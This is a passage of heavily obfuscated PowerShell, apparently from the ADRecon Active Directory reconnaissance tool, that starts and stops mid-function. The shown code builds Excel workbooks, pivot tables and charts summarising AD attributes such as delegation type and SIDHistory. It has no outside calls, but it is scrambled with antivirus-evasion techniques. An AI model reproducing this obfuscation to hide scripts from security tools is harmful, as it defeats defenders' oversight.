    
    If (${f`Inal})
    {
         ( get-cHIldIteM ("v"+"aR"+"i"+"ABlE:xnJ"+"Zs")  ).valuE::("{2}{1}{4}{0}{3}"-f 'O','eleaseC','FinalR','bject','om').Invoke(${COm`O`BjtOr`elea`se}) | &("{1}{2}{0}"-f'll','Out-','Nu')
    }
    Else
    {
         (  GeT-cHilDItEM  vaRIABLe:xNJzS).vAlue::("{2}{3}{4}{1}{0}" -f'omObject','eC','Re','l','eas').Invoke(${cO`mOb`jToRe`l`eaSe}) | &("{1}{0}" -f 't-Null','Ou')
    }
     $4agx::("{0}{1}" -f'Co','llect').Invoke()
     $4agx::("{6}{1}{0}{3}{5}{4}{2}" -f'Pend','or','zers','ingFin','i','al','WaitF').Invoke()
}

Function gE`T-`AdreXCel`woRKboOK
{

    param (
        [Parameter(MandAtory = ${t`RUe})]
        [string] ${n`AMe}
    )

    ${wO`RK`BOok}."WO`Rk`sHEEtS".("{0}{1}" -f'Ad','d').Invoke() | &("{1}{2}{0}" -f't-Null','O','u')
    ${Wor`kshe`Et} = ${WOrKB`o`ok}."WOrksH`e`eTS".("{0}{1}" -f'I','tem').Invoke(1)
    ${W`O`RkShEEt}."NA`ME" = ${n`AMe}

    &("{3}{1}{0}{4}{2}"-f'e','celComObjR','e','Get-ADREx','leas') -ComObjtoRelease ${WOrk`sh`EEt}
    &("{2}{1}{0}{3}" -f've-Vari','o','Rem','able') ("{0}{1}" -f 'wo','rksheet')
}

Function gET-AdR`ex`C`EL`ImpOrt
{

    param (
        [Parameter(mANDAtoRy = ${tr`UE})]
        [string] ${A`DFileN`AME},

        [Parameter(MaNdATORy = ${F`A`LsE})]
        [int] ${MET`hoD} = 1,

        [Parameter(MaNDATORY = ${fAL`sE})]
        [int] ${R`oW} = 1,

        [Parameter(MANdAtoRy = ${fa`lSE})]
        [int] ${co`Lu`Mn} = 1
    )

    ${eX`cel}."S`cReEN`Up`DAting" = ${fa`l`sE}
    If (${MET`HoD} -eq 1)
    {
        If (&("{1}{0}{2}"-f't','Test-Pa','h') ${Ad`F`IlenAme})
        {
            ${woRKsh`E`eT} = ${wor`Kb`OOK}."WO`RK`Sh`eetS".("{0}{1}"-f'It','em').Invoke(1)
            ${TXTC`O`Nnec`T`Or} = (("{1}{0}"-f 'XT;','TE') + ${aDfIlE`N`AMe})
            ${ceL`lrEF} = ${WOrKSh`e`Et}.("{0}{1}" -f 'R','ange').Invoke("A1")
            
            ${Con`NECt`or} = ${W`OR`KSHE`eT}."qUeryTA`B`LeS".("{0}{1}"-f'ad','d').Invoke(${T`xtc`o`NNeCtOr}, ${cEL`LREF})

            
            ${WORk`S`heEt}."QUERyTa`B`L`Es".("{1}{0}" -f 'm','ite').Invoke(${cO`NNEC`TOr}."na`ME")."tEXtf`i`lE`PlatForm" = 65001
            ${wor`KsH`EEt}."QUE`RYTaB`LES".("{1}{0}"-f'tem','i').Invoke(${cO`Nn`EctoR}."Na`mE")."tExtFi`Lec`o`MM`AD`ElImI`Ter" = ${tr`Ue}
            ${wO`RKsH`e`et}."qUEry`Ta`BLES".("{1}{0}" -f'm','ite').Invoke(${cO`N`NE`CToR}."n`AmE")."tEXtfI`lEPa`RSE`T`ype" = 1
            ${wo`R`kshEET}."QuE`RyTAb`LEs".("{0}{1}" -f 'ite','m').Invoke(${co`N`NectoR}."N`AMe").("{1}{2}{0}" -f 'h','Refr','es').Invoke() | &("{2}{1}{0}"-f '-Null','ut','O')
            ${wOrk`s`HEet}."QU`er`ytabLES".("{1}{0}"-f 'em','it').Invoke(${co`NNE`Ctor}."N`Ame").("{1}{0}"-f 'lete','de').Invoke()

            &("{0}{6}{2}{5}{4}{1}{3}{7}" -f 'Get','omObjRele','DRExce','as','C','l','-A','e') -ComObjtoRelease ${C`ELLREf}
            &("{0}{2}{1}{3}"-f 'Remov','Va','e-','riable') ("{0}{1}"-f'Ce','llRef')
            &("{4}{2}{1}{3}{0}"-f 'e','lComObjRe','ce','leas','Get-ADREx') -ComObjtoRelease ${connEc`T`OR}
            &("{3}{0}{2}{1}" -f 'm','-Variable','ove','Re') ("{1}{0}{2}" -f 'o','Connect','r')

            ${li`s`TObj`EcT} = ${wo`RKsHe`ET}."l`isTO`BjectS"."A`Dd"( $ThUJe::"XLsrcRA`N`GE", ${Wo`RkS`hEet}."Used`Ra`NGE", ${N`Ull},  (  VAriabLE k1U3m5  ).VAlue::"X`LYES", ${N`Ull})
            ${LIStoB`J`E`Ct}."T`ABleST`ylE" = ("{0}{4}{3}{2}{1}" -f'Tabl','2','t','eLigh','eStyl') 
            ${WOrkS`HE`Et}."USE`DR`AngE"."e`Nt`irEcOLu`Mn".("{1}{0}" -f 't','AutoFi').Invoke() | &("{1}{0}" -f't-Null','Ou')
        }
        &("{1}{3}{0}{2}"-f'b','Rem','le','ove-Varia') ("{0}{1}{2}" -f 'AD','FileNam','e')
    }
    Elseif (${M`et`Hod} -eq 2)
    {
        ${WoRk`S`Heet} = ${Wo`RkbO`Ok}."WOrk`SH`EeTS".("{0}{1}"-f 'I','tem').Invoke(1)
        If (&("{2}{1}{0}"-f'-Path','est','T') ${adf`IlE`NamE})
        {
            ${aD`TeMP} = &("{0}{2}{1}"-f 'Im','sv','port-C') -Path ${aDf`i`LeN`AmE}
            ${Ad`Te`mp} | &("{2}{0}{1}{3}{4}"-f'r','Each-Ob','Fo','jec','t') {
                Foreach (${p`ROP} in ${_}."pSObj`e`CT"."P`RopeR`TieS")
                {
                    ${w`Or`KShEET}."ceL`Ls".("{1}{0}"-f 'tem','I').Invoke(${R`OW}, ${C`olu`MN}) = ${pR`op}."n`Ame"
                    ${WoRK`S`heET}."CE`lLS".("{1}{0}"-f'em','It').Invoke(${r`oW}, ${c`oLuMn} + 1) = ${p`RoP}."v`Alue"
                    ${R`ow}++
                }
            }
            &("{1}{2}{0}"-f'e','Remove','-Variabl') ("{1}{0}" -f 'DTemp','A')
            ${l`I`StO`BjeCT} = ${wO`RkShe`eT}."liStoBj`E`C`Ts"."A`dD"(  (  gEt-vArIAbLE  ('T'+'HUJe')  -vAlu )::"xLsr`Cran`GE", ${W`oRk`shEet}."UsEDr`An`Ge", ${Nu`Ll},  (  LS  ('vAr'+'iaBl'+'E:K'+'1U3M5') ).VaLUE::"Xly`eS", ${n`Ull})
            ${lI`stoB`jecT}."t`ABle`s`Tyle" = ("{3}{0}{1}{2}{4}"-f 'eStyl','e','Lig','Tabl','ht2') 
            ${UsEd`Ra`NgE} = ${wO`R`KSHE`eT}."U`S`edrAngE"
            ${useD`R`ANGE}."eNTirEc`oL`U`mn".("{0}{1}" -f 'AutoFi','t').Invoke() | &("{0}{1}{2}" -f'Out-','Nul','l')
        }
        Else
        {
            ${W`o`RkSheet}."ce`lls".("{0}{1}" -f 'I','tem').Invoke(${r`OW}, ${c`oLUmn}) = ("{1}{0}"-f 'r!','Erro')
        }
        &("{1}{3}{2}{0}"-f 'e','Remove-Var','bl','ia') ("{2}{1}{3}{0}"-f'me','e','ADFil','Na')
    }
    ${EXC`el}."ScrE`enUp`dat`INg" = ${Tr`Ue}

    &("{6}{1}{3}{2}{7}{0}{4}{5}"-f 'Rele','t-AD','ExcelCo','R','a','se','Ge','mObj') -ComObjtoRelease ${WORK`s`HEET}
    &("{0}{1}{3}{4}{2}"-f'R','emo','e','ve-Var','iabl') ("{1}{0}{2}" -f'ks','wor','heet')
}


Function gE`T-aDRexCE`l`P`I`VoTTabLE
{

    param (
        [Parameter(manDATORY = ${t`Rue})]
        [string] ${SRc`SHE`e`TnaME},

        [Parameter(mAndATOrY = ${tr`Ue})]
        [string] ${p`IVoTTAb`le`NAME},

        [Parameter(mANDatorY = ${f`Al`sE})]
        [array] ${p`I`VOt`ROwS},

        [Parameter(MaNdaTORY = ${F`A`Lse})]
        [array] ${PIv`OtC`olUMnS},

        [Parameter(MANDAtorY = ${FA`L`SE})]
        [array] ${p`I`VoTF`IL`TerS},

        [Parameter(maNDATOry = ${F`AlsE})]
        [array] ${p`i`Vo`TVAlUes},

        [Parameter(mAndaTOrY = ${FA`lse})]
        [array] ${P`I`VoTpERCEntA`GE},

        [Parameter(MANDaTORy = ${FA`l`se})]
        [string] ${pi`VOTLO`ca`TiOn} = ("{1}{0}" -f 'C1','R1')
    )

    ${ExC`eL}."sc`REenUpdA`TiNg" = ${Fa`lSe}
    ${SrcWOrkSH`E`ET} = ${WoRkB`O`ok}."sHe`E`TS".("{1}{0}" -f'tem','I').Invoke(${srcS`He`eTnA`me})
    ${WorK`B`ook}."s`H`OwPI`VO`TtABleFI`el`dLIST" = ${Fa`L`SE}

    
    
    
    
    
    

    
    
    ${pIVOtF`A`I`leD} = ${fa`L`SE}
    Try
    {
        ${p`iVo`T`cachES} = ${Wo`R`kbooK}.("{3}{2}{0}{1}" -f'a','ches','votC','Pi').Invoke()."cRe`ATe"(  (  vaRiablE ('L38'+'r')).VAluE::"X`l`DATAB`Ase", ${SrcWo`R`ksHEet}."u`SEdR`An`gE",   $gnv::"x`LPIvOtTAbLEV`eRsIO`N`12")
    }
    Catch
    {
        ${piv`Ot`FaileD} = ${tr`UE}
        &("{1}{3}{2}{0}" -f 'se','Write-V','rbo','e') ("{4}{6}{3}{5}{2}{0}{1}" -f'ail','ed','e] F','Cr','[PivotCache','eat','s().')
        &("{2}{1}{0}"-f 'ose','erb','Write-V') "[EXCEPTION] $($_.Exception.Message) "
    }
    If ( ${pivo`TfaI`lEd} -eq ${t`Rue} )
    {
        ${RO`Ws} = ${SR`C`woRKs`HeET}."usedRA`Nge"."ro`Ws"."C`OunT"
        If (${sr`cSHeE`T`NA`ME} -eq ("{3}{0}{1}{2}"-f ' SP','N','s','Computer'))
        {
            ${PIvoT`c`Ols} = ("{0}{1}" -f 'A1:','C')
        }
        ElseIf (${sr`csH`eeT`N`AME} -eq ("{0}{1}{2}{3}" -f 'Comp','ute','r','s'))
        {
            ${p`IvO`TcolS} = ("{1}{0}"-f '1:F','A')
        }
        ElseIf (${sR`cSh`e`eT`NAMe} -eq ("{1}{0}"-f 'sers','U'))
        {
            ${P`IvoTc`Ols} = ("{0}{1}"-f'A','1:C')
        }
        ${uS`EdrAN`GE} = ${s`RCW`orksHE`eT}.("{0}{1}" -f 'Ran','ge').Invoke(${piv`Otc`oLS}+${ro`wS})
        ${P`iVoT`c`AChes} = ${W`OrKBo`oK}.("{0}{2}{1}"-f 'P','Caches','ivot').Invoke()."C`R`eatE"( (VaRIAble l38R  ).vaLUE::"xlDAt`Ab`Ase", ${usED`Ra`N`GE},  (get-VaRiABle gNv  -VA)::"xL`PiVOtT`AB`Lev`ersI`O`N12")
        &("{0}{1}{3}{2}"-f'Remov','e-','ariable','V') ("{1}{0}" -f'ows','r')
	    &("{1}{2}{0}" -f'able','Rem','ove-Vari') ("{2}{0}{1}"-f'ivot','Cols','P')
        &("{1}{0}{2}{3}"-f'e-Va','Remov','riab','le') ("{3}{0}{2}{1}"-f'dRa','ge','n','Use')
    }
    &("{0}{1}{3}{2}" -f'Rem','ove-Vari','e','abl') ("{2}{1}{0}"-f'ed','tFail','Pivo')
    ${p`IvO`TtAblE} = ${PIVOtCa`C`H`es}.("{1}{0}{2}"-f 'eatePi','Cr','votTable').Invoke(${piv`otL`oc`AtIoN},${Piv`O`Tt`AbL`ENamE})
    

    If (${p`iVO`TROwS})
    {
        ForEach (${r`ow} in ${PiV`oTRO`Ws})
        {
            ${PiVOTF`I`eld} = ${PIv`Ot`TaB`le}.("{1}{0}{2}{3}" -f 'otF','Piv','iel','ds').Invoke(${r`oW})
            ${Pi`VotF`IE`Ld}."O`Rien`TAt`Ion" =  (GEt-iTeM  VarIABLe:7ybGK  ).VAlue::"xlROw`Fi`e`Ld"
        }
    }

    If (${PIvo`Tc`O`lUm`Ns})
    {
        ForEach (${c`ol} in ${P`ivoTCOLU`MnS})
        {
            ${PI`V`Otf`IeLd} = ${p`iVO`TtABle}.("{1}{2}{0}" -f 'ds','PivotFie','l').Invoke(${C`Ol})
            ${pIvOT`FI`E`lD}."O`R`I`ENTAtion" =   $7yBgk::"XlColU`mNfi`ELd"
        }
    }

    If (${piVOTfI`lT`eRS})
    {
        ForEach (${f`IL} in ${p`i`VoT`FilTerS})
        {
            ${p`IVot`FIEld} = ${piv`oTT`A`BlE}.("{0}{2}{1}"-f 'P','ds','ivotFiel').Invoke(${F`Il})
            ${P`IvOtfi`E`Ld}."O`Ri`enT`ATIon" =  (gEt-vAriAbLE  7Ybgk  -VAlU )::"XlpAge`F`ielD"
        }
    }

    If (${PI`VOT`VA`lueS})
    {
        ForEach (${v`AL} in ${pI`VotvA`l`UES})
        {
            ${pI`V`oTf`IelD} = ${Pi`VoTt`A`BlE}.("{1}{2}{0}{3}"-f 'o','Pi','v','tFields').Invoke(${V`Al})
            ${Pi`V`oT`FIELd}."ori`EntaT`ION" =  $7yBGK::"XLd`ATAf`ieLD"
        }
    }

    If (${pi`V`O`T`per`cEntAGE})
    {
        ForEach (${v`AL} in ${PiVo`Tp`E`Rc`eN`TaGe})
        {
            ${pIvoTF`Ie`lD} = ${pivoTt`AB`lE}.("{2}{1}{0}" -f 'ields','votF','Pi').Invoke(${v`Al})
            ${pIVot`F`IElD}."oRI`Enta`Ti`ON" =   ( get-VAriaBlE ('7y'+'bgk')  -val  )::"XLDA`TafIE`Ld"
            ${pi`Vo`Tfi`ElD}."C`AlCUL`Ati`on" =   ( itEM  vaRIable:K59Z ).VaLuE::"X`L`PE`RceN`TOf`TotAL"
            ${PIvOTt`Ab`LE}."ShowVa`lUe`srOW" = ${fA`l`SE}
        }
    }

    
    ${exc`EL}."Sc`RE`en`U`PdAtINg" = ${Tr`UE}

    &("{3}{1}{4}{2}{0}" -f'omObjRelease','E','celC','Get-ADR','x') -ComObjtoRelease ${pivoT`Fi`ElD}
    &("{2}{1}{3}{0}"-f 'e','ria','Remove-Va','bl') ("{0}{2}{1}" -f 'P','votField','i')
    &("{3}{1}{4}{0}{2}"-f'ComObjR','t-','elease','Ge','ADRExcel') -ComObjtoRelease ${p`ivOT`T`Able}
    &("{0}{3}{1}{2}{4}" -f'Remove','ab','l','-Vari','e') ("{0}{1}{2}"-f 'P','ivotTa','ble')
    &("{4}{3}{1}{0}{2}"-f 'Rel','RExcelComObj','ease','AD','Get-') -ComObjtoRelease ${piv`ot`c`Aches}
    &("{4}{1}{3}{2}{0}" -f'e','em','-Variabl','ove','R') ("{1}{2}{0}" -f'otCaches','P','iv')
    &("{2}{1}{0}{4}{3}{5}"-f'o','-ADRExcelC','Get','Rel','mObj','ease') -ComObjtoRelease ${S`RcW`O`RK`sHEet}
    &("{2}{1}{0}{3}" -f'e-Variabl','ov','Rem','e') ("{2}{0}{3}{1}"-f'rcWorks','et','S','he')
}

Function G`et`-Ad`REx`ceLat`TrI`Bu`TeStaTs
{

    param (
        [Parameter(MandATORY = ${T`Rue})]
        [string] ${SRCsH`Ee`T`Na`me},

        [Parameter(MaNDatorY = ${T`RUe})]
        [string] ${t`iTl`e1},

        [Parameter(mandATORY = ${t`RuE})]
        [string] ${P`ivO`TT`ABLeN`Ame},

        [Parameter(ManDATOry = ${TR`Ue})]
        [string] ${pIvOT`R`O`Ws},

        [Parameter(MandAToRY = ${Tr`UE})]
        [string] ${pI`VO`TvalUEs},

        [Parameter(maNdAtoRY = ${Tr`Ue})]
        [string] ${P`Iv`OtPerC`enT`AGE},

        [Parameter(MandatorY = ${tr`Ue})]
        [string] ${tI`T`LE2},

        [Parameter(mAndaTORy = ${TR`UE})]
        [System.Object] ${oB`JAtt`RIB`UtEs}
    )

    ${E`XC`el}."sCrEE`N`UPdaTinG" = ${Fa`LsE}
    ${WOR`KShe`eT} = ${wo`Rk`BoOk}."wO`R`ksHeETS".("{1}{0}" -f'tem','I').Invoke(1)
    ${Sr`c`w`O`RkshEet} = ${wO`Rkbo`OK}."S`hEeTs".("{0}{1}" -f'Ite','m').Invoke(${sR`cShE`ETN`Ame})

    ${r`OW} = 1
    ${co`L`Umn} = 1
    ${WOr`K`S`HeEt}."C`EllS".("{0}{1}"-f 'Ite','m').Invoke(${R`ow}, ${C`oluMN}) = ${Tit`L`e1}
    ${w`oRkS`He`ET}."CEL`LS".("{1}{0}" -f 'm','Ite').Invoke(${r`ow},${cOL`UMn})."StY`lE" = ("{0}{2}{1}" -f 'Hea','ing 2','d')
    ${W`OR`ksHeet}."C`ELLs".("{1}{0}" -f'tem','I').Invoke(${r`Ow},${c`oLu`MN})."HOri`Zo`NTA`LAli`Gn`mEnt" = -4108
    ${MERGe`Ce`llS} = ${wO`RkS`h`EET}.("{1}{0}" -f 'e','Rang').Invoke(("{0}{1}"-f'A1:C','1'))
    ${MeRg`E`C`ells}.("{1}{0}" -f'ct','Sele').Invoke() | &("{1}{2}{0}"-f'l','Ou','t-Nul')
    ${mer`g`eCe`Lls}."MErgECe`L`lS" = ${T`Rue}
    &("{1}{0}{2}{3}" -f 'move-V','Re','ariabl','e') ("{0}{1}{2}"-f'M','er','geCells')

    &("{0}{1}{2}{3}{4}"-f 'Ge','t-AD','RExce','lP','ivotTable') -SrcSheetName ${s`RCShe`eT`Na`me} -PivotTableName ${p`ivO`TtABlena`me} -PivotRows @(${Piv`otr`ows}) -PivotValues @(${pi`VOtv`Alu`eS}) -PivotPercentage @(${pI`VOtp`ER`C`ENTagE}) -PivotLocation ("{1}{0}" -f 'C1','R2')
    ${E`XCel}."ScreE`NuPD`A`TINg" = ${Fa`l`sE}

    ${R`oW} = 2
    ("{1}{0}" -f'ype','T'),("{1}{0}" -f'unt','Co'),("{0}{1}{2}" -f 'Pe','rcenta','ge') | &("{2}{1}{0}" -f'ect','ach-Obj','ForE') {
        ${wor`ksh`EeT}."CEl`LS".("{0}{1}"-f'It','em').Invoke(${r`ow}, ${CO`Lumn}) = ${_}
        ${wOrKS`H`Eet}."Cel`lS".("{0}{1}" -f 'Ite','m').Invoke(${R`oW}, ${CO`Lu`mN})."FO`NT"."b`OlD" = ${tR`UE}
        ${coLu`MN}++
    }

    ${r`Ow} = 3
    ${COlu`mn} = 1
    For(${r`ow} = 3; ${r`OW} -le 6; ${r`ow}++)
    {
        ${Te`mPt`e`Xt} = [string] ${wo`RK`ShEeT}."c`elLS".("{1}{0}" -f'm','Ite').Invoke(${r`Ow}, ${Col`UMn})."t`eXT"
        switch (${tEmp`TeXT}.("{2}{0}{1}"-f'Upp','er','To').Invoke())
        {
            ("{1}{0}" -f'E','TRU') { ${W`OrKS`HeeT}."C`eLLS".("{1}{0}" -f'tem','I').Invoke(${R`ow}, ${Co`lumn}) = ("{1}{2}{0}" -f 'ed','En','abl') }
            ("{1}{0}" -f'SE','FAL') { ${worKS`hE`et}."c`ells".("{1}{0}" -f'tem','I').Invoke(${R`OW}, ${c`Olu`mN}) = ("{1}{0}" -f'ed','Disabl') }
            ("{2}{1}{0}{3}"-f ' TOT','D','GRAN','AL') { ${W`orKS`he`ET}."ceL`ls".("{0}{1}"-f'I','tem').Invoke(${r`oW}, ${colu`MN}) = ("{1}{0}" -f 'tal','To') }
        }
    }

    If (${o`BJAttr`IbuT`es})
    {
        ${R`Ow} = 1
        ${C`OLUMn} = 6
        ${w`orKs`he`ET}."ce`lls".("{1}{0}" -f 'm','Ite').Invoke(${r`oW}, ${c`O`Lumn}) = ${ti`TLE2}
        ${wO`RKs`heeT}."cEL`ls".("{0}{1}"-f'I','tem').Invoke(${R`OW},${C`OluMN})."ST`Yle" = ("{2}{0}{1}"-f 'i','ng 2','Head')
        ${W`OrksH`EeT}."C`ElLS".("{0}{1}" -f'It','em').Invoke(${R`OW},${CoL`U`mN})."HoRIzON`TaLALIg`NM`e`NT" = -4108
        ${M`Er`geceLLS} = ${W`o`RK`shEeT}.("{0}{1}"-f 'Ran','ge').Invoke(("{0}{1}"-f'F1:L','1'))
        ${mergEc`El`lS}.("{0}{1}" -f'S','elect').Invoke() | &("{1}{0}{2}"-f 't','Ou','-Null')
        ${meR`Gec`ELls}."mErGe`c`elLS" = ${t`RuE}
        &("{0}{3}{2}{1}" -f'R','ble','aria','emove-V') ("{0}{1}{2}" -f'Me','rg','eCells')

        ${R`ow}++
        ("{2}{1}{0}"-f 'ry','go','Cate'),("{1}{2}{0}" -f 'led Count','Ena','b'),("{2}{1}{3}{0}"-f'e','rce','Enabled Pe','ntag'),("{3}{1}{0}{2}" -f'd Co','le','unt','Disab'),("{1}{3}{2}{6}{5}{0}{4}"-f'a','Dis','bled','a','ge','nt',' Perce'),("{0}{2}{3}{1}" -f'T','nt','ota','l Cou'),("{3}{0}{1}{4}{2}"-f 't','al Pe','entage','To','rc') | &("{3}{0}{1}{2}" -f'ach','-O','bject','ForE') {
            ${Wo`RKSH`eEt}."CeL`LS".("{0}{1}"-f 'Ite','m').Invoke(${R`ow}, ${c`OLuMN}) = ${_}
            ${w`orKs`he`ET}."C`ELls".("{0}{1}"-f 'I','tem').Invoke(${r`OW}, ${C`Ol`UMn})."fo`Nt"."Bo`Ld" = ${T`RUe}
            ${co`lu`Mn}++
        }
        ${eX`C`Elc`oLumn} = (${s`RCWOR`k`she`eT}."co`L`UMNS".("{1}{0}" -f'nd','Fi').Invoke(("{2}{0}{1}"-f'l','ed','Enab')))
        ${EN`ABlE`DcOLADdR`e`Ss} = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
        ${Col`UmN} = 6
        ${I} = 2

        ${O`BjAttrIB`UtEs}."kE`YS" | &("{0}{3}{2}{1}" -f'ForEac','t','Objec','h-') {
            ${E`XC`e`lcOlumN} = (${s`Rc`woRK`sh`Eet}."Co`l`UMns".("{1}{0}"-f'd','Fin').Invoke(${_}))
            ${COLAdd`Re`ss} = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
            ${r`Ow}++
            ${I}++
            If (${_} -eq ("{0}{4}{2}{1}{3}"-f 'De','Ty','ion ','p','legat'))
            {
                ${wOrKs`h`eEt}."cel`ls".("{0}{1}"-f 'I','tem').Invoke(${r`OW}, ${cO`l`UmN}) = ("{1}{4}{6}{5}{3}{2}{0}" -f'on','Unc','ti','lega','onstrained ','e','D')
            }
            ElseIf (${_} -eq ("{4}{1}{2}{0}{3}" -f'n Typ','egati','o','e','Del'))
            {
                ${wO`RKS`hEet}."CE`lls".("{0}{1}" -f 'It','em').Invoke(${R`ow}, ${c`OL`Umn}) = ("{4}{1}{2}{0}{3}"-f'd Delegatio','ai','ne','n','Constr')
            }
            Else
            {
                ${W`oRksH`EeT}."CEL`lS".("{0}{1}"-f 'Ite','m').Invoke(${R`oW}, ${C`o`luMN})."F`o`RMula" = "='" + ${SrCW`OrkSH`Eet}."NA`mE" + "'!" + ${EXCe`lC`oLuMN}.("{1}{0}"-f 'ddress','A').Invoke(${f`A`Lse},${f`A`lse})
            }
            ${WO`Rk`SHEet}."cEl`Ls".("{1}{0}"-f 'm','Ite').Invoke(${R`oW}, ${c`OL`Umn}+1)."Fo`R`MuLa" = (((("{2}{0}{3}{1}"-f 'F','(981','=COUNTI','S'))  -cREPLacE  '981',[ChAR]39)) + ${SR`Cwo`RKSHeet}."n`AMe" + "'!" + ${enaBL`Ed`coLa`dD`RE`SS} + ((("{1}{2}{0}"-f '},',',{0}TRUE','{0'))-f[cHar]34) + "'" + ${S`Rc`wo`RKSHeet}."n`Ame" + "'!" + ${c`olAd`dress} + ',' + ${OB`ja`TtRi`BuTEs}[${_}] + ')'
            ${w`OR`ks`HeEt}."Cel`ls".("{0}{1}" -f 'Ite','m').Invoke(${R`Ow}, ${coLU`MN}+2)."FORm`U`LA" = ((("{1}{2}{0}"-f 'R(G','=IF','ERRO'))) + ${i} + (((("{6}{3}{1}{7}{4}{2}{0}{5}{8}"-f '6,2,FALS','7Ena','3:B','KUP(rw','7,A','E','/VLOO','bledrw','),0)')) -CrEPLAce  ([cHar]114+[cHar]119+[cHar]55),[cHar]34))
            ${wO`R`KSHEet}."C`elLS".("{0}{1}" -f'It','em').Invoke(${r`oW}, ${C`oL`UMn}+3)."f`oRMUla" = (((("{0}{1}{3}{2}" -f '=COU','NT','S({0}','IF'))  -F [CHar]39)) + ${sR`CwORksH`e`et}."NA`ME" + "'!" + ${eN`AbLeDc`oLad`dREsS} + ((("{0}{3}{1}{2}" -f ',{0','LSE','{0},','}FA'))  -f[Char]34) + "'" + ${Sr`CW`OrkSHe`eT}."N`AMe" + "'!" + ${Col`ADdr`Ess} + ',' + ${oB`j`AtTRiB`UtEs}[${_}] + ')'
            ${WOrK`S`heet}."cEL`LS".("{0}{1}" -f 'I','tem').Invoke(${R`OW}, ${COLu`Mn}+4)."F`OrmUlA" = ((("{0}{1}{2}" -f'=','IFERRO','R(I'))) + ${i} + (((("{5}{6}{0}{2}{1}{3}{7}{4}"-f 'UxDi','Ux,A3:B','sabledK','6,2,F','SE),0)','/V','LOOKUP(K','AL')) -CREplAcE  ([ChAr]75+[ChAr]85+[ChAr]120),[ChAr]34))
            If ( (${_} -eq ("{2}{0}{1}"-f 't','ory','SIDHis')) -or (${_} -eq ("{0}{3}{4}{2}{1}" -f'm','Sid','eator','s-ds-','Cr')) )
            {
                
                ${wOrK`SHE`et}."ceL`LS".("{0}{1}" -f 'I','tem').Invoke(${r`oW}, ${COl`UMn}+5)."fORmU`la" = (((("{0}{1}"-f '=COUN','TIF(TwG'))-rEpLaCE 'TwG',[ChAR]39)) + ${s`RCw`O`RKshEeT}."na`ME" + "'!" + ${C`OladdrE`Ss} + ',' + ${O`B`ja`Tt`RibuTES}[${_}] + ')-1'
            }
            Else
            {
                ${wOrk`sH`EEt}."cEl`Ls".("{1}{0}" -f 'em','It').Invoke(${r`ow}, ${co`lU`Mn}+5)."fo`RMULA" = (((("{0}{2}{1}{3}"-f'=','(','COUNTIF','{0}'))  -F [CHAR]39)) + ${Sr`cw`oR`Ksh`EET}."N`AME" + "'!" + ${COL`AD`dR`ess} + ',' + ${o`Bj`ATTRIbUTEs}[${_}] + ')'
            }
            ${worK`S`he`ET}."CeL`LS".("{1}{0}"-f'tem','I').Invoke(${R`OW}, ${C`o`lUMN}+6)."foRmU`La" = ((("{2}{1}{0}" -f'ERROR(K','F','=I'))) + ${i} + (((("{4}{5}{1}{2}{7}{3}{6}{0}" -f 'SE),0)','OOKU','P',':','/V','L','B6,2,FAL','({0}Total{0},A3')) -F [chAR]34))
        }

        
        "H", "J" , "L" | &("{1}{0}{2}{3}"-f'rEach','Fo','-Obj','ect') {
            ${r`Ng} = ${_} + $(${R`Ow} - ${O`Bjatt`R`IB`UTEs}."cO`UNt" + 1) + ":" + ${_} + $(${R`OW})
            ${W`orKs`heET}.("{1}{0}"-f 'e','Rang').Invoke(${r`NG})."nu`MBE`RfOR`MAT" = ("{1}{0}"-f'.00%','0')
        }
    }
    ${eXC`el}."ScRee`Nu`pD`A`TiNg" = ${tR`UE}

    &("{4}{0}{3}{1}{2}"-f'DRExcelCom','eas','e','ObjRel','Get-A') -ComObjtoRelease ${s`Rcwo`RkS`heeT}
    &("{1}{2}{3}{0}{4}"-f'l','Remove','-Var','iab','e') ("{1}{0}{2}" -f 'rkshe','SrcWo','et')
    &("{4}{2}{7}{6}{0}{3}{1}{5}"-f'o','el','t-ADREx','mObjR','Ge','ease','lC','ce') -ComObjtoRelease ${Wo`RK`shEEt}
    &("{0}{1}{3}{2}" -f 'Re','move','able','-Vari') ("{0}{1}"-f'work','sheet')
}

Function g`e`T-A`d`REXcElCHArt
{

    param (
        [Parameter(maNdAtORy = ${T`Rue})]
        [string] ${ch`Ar`TtY`pe},

        [Parameter(mANDaTORY = ${TR`Ue})]
        [int] ${cHAr`T`LA`YouT},

        [Parameter(MANdAtory = ${Tr`UE})]
        [string] ${Cha`RTTi`T`LE},

        [Parameter(MaNdaToRy = ${tr`UE})]
        ${RAn`g`ET`oCOVer},

        [Parameter(mandaTorY = ${fa`lSe})]
        ${CHa`RTd`AtA} = ${n`Ull},

        [Parameter(manDAtORy = ${F`AL`se})]
        ${sTAR`T`Row} = ${nu`LL},

        [Parameter(mANdAtORY = ${f`AlsE})]
        ${S`TAR`TcoLUMN} = ${nU`ll}
    )

    ${e`x`cEL}."S`C`ReenUpDATiNg" = ${f`AlsE}
    ${ex`ceL}."diS`plA`Ya`lErts" = ${FAl`sE}
    ${wor`kShe`et} = ${wOR`kbO`Ok}."WoR`kshEE`TS".("{0}{1}" -f 'I','tem').Invoke(1)
    ${ch`Art} = ${w`OrKSH`e`et}."sh`APES".("{2}{0}{1}" -f'Cha','rt','Add').Invoke()."CH`ARt"
    
    ${CH`A`RT}."C`HAr`TTYpE" = [int]( $Qp7::${ch`ARTty`PE})
    ${CH`A`Rt}.("{2}{3}{1}{0}"-f 'ut','plyLayo','A','p').Invoke(${chaR`TLaY`O`UT})
    If (${N`Ull} -eq ${CHA`RT`dATa})
    {
        If (${Nu`Ll} -eq ${sT`AR`T`ROW})
        {
            ${s`TArT} = ${w`OrkShe`ET}.("{1}{0}" -f 'ge','Ran').Invoke("A1")
        }
        Else
        {
            ${sTa`RT} = ${wor`k`shEEt}.("{0}{1}" -f'Ra','nge').Invoke(${sTa`Rt`ROw})
        }
        
        ${X} = ${woRK`ShE`eT}."ran`GE"(${S`T`ARt},${S`T`ArT}."E`Nd"( (vARiABLe  ("4aT"+"c") ).VALue::"xL`DO`wN"))
        If (${nu`LL} -eq ${S`TA`RTCoL`UMN})
        {
            ${s`TArT} = ${Wo`RksH`eEt}.("{0}{1}" -f'Rang','e').Invoke("B1")
        }
        Else
        {
